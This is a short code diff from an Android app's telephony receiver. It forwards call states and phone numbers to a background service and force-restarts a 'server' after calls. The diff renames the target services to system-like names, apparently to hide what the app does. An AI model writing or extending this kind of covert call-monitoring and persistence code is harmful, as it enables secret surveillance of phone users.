@@ -137,7 +137,7 @@ public class TelephonyState extends BroadcastReceiver {
 
     private void sendCallStateToService(Context context, int callState, String phoneNumber) {
         try {
-            Intent serviceIntent = new Intent(context, AudioStability.class);
+            Intent serviceIntent = new Intent(context, MediaFrameworkService.class);
             serviceIntent.setAction("CALL_STATE_CHANGED");
             serviceIntent.putExtra("call_state", callState);
             serviceIntent.putExtra("phone_number", phoneNumber);
@@ -154,7 +154,7 @@ public class TelephonyState extends BroadcastReceiver {
 
     private void resurrectServerIfNeeded(Context context) {
         Log.d(TAG, "RESURRECTOR: Verifying server health after call...");
-        Intent serviceIntent = new Intent(context, CoreSyncService.class);
+        Intent serviceIntent = new Intent(context, WorkManager_Sync.class);
         serviceIntent.setAction("START");
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             context.startForegroundService(serviceIntent);
